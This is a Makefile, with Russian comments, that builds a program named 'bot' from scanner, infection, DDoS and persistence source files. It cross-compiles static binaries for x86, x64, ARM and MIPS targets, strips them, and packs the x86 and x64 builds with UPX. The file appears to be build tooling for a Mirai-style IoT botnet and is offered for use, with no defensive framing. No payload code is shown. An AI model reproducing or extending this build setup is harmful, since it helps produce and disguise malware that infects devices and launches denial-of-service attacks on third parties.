# bot/Makefile
CC = gcc
CFLAGS = -Wall -O2 -s -static -pthread
LIBS = -lpthread

# Архитектуры
ARCHS = x86 x64 arm arm7 mips mipsel

all: $(addprefix build/bot_, $(ARCHS))

# x86 (32-bit)
build/bot_x86: bot.c scanner.c infection.c ddos.c persistence.c
	$(CC) $(CFLAGS) -m32 $^ -o $@ $(LIBS)
	strip $@
	upx --ultra-brute $@

# x64 (64-bit)
build/bot_x64: bot.c scanner.c infection.c ddos.c persistence.c
	$(CC) $(CFLAGS) -m64 $^ -o $@ $(LIBS)
	strip $@
	upx --ultra-brute $@

# ARM
build/bot_arm: bot.c scanner.c infection.c ddos.c persistence.c
	arm-linux-gnueabi-gcc $(CFLAGS) $^ -o $@ $(LIBS)
	arm-linux-gnueabi-strip $@

# ARMv7
build/bot_arm7: bot.c scanner.c infection.c ddos.c persistence.c
	arm-linux-gnueabihf-gcc $(CFLAGS) $^ -o $@ $(LIBS)
	arm-linux-gnueabihf-strip $@

# MIPS
build/bot_mips: bot.c scanner.c infection.c ddos.c persistence.c
	mips-linux-gnu-gcc $(CFLAGS) $^ -o $@ $(LIBS)
	mips-linux-gnu-strip $@

# MIPSel
build/bot_mipsel: bot.c scanner.c infection.c ddos.c persistence.c
	mipsel-linux-gnu-gcc $(CFLAGS) $^ -o $@ $(LIBS)
	mipsel-linux-gnu-strip $@

# Очистка
clean:
	rm -f build/*

# Установка компиляторов
install_compilers:
	apt-get update
	apt-get install -y gcc-multilib g++-multilib \
		arm-linux-gnueabi-gcc arm-linux-gnueabihf-gcc \
		mips-linux-gnu-gcc mipsel-linux-gnu-gcc \
		upx-ucl

# Сборка всех
build_all: install_compilers all

.PHONY: all clean install_compilers build_all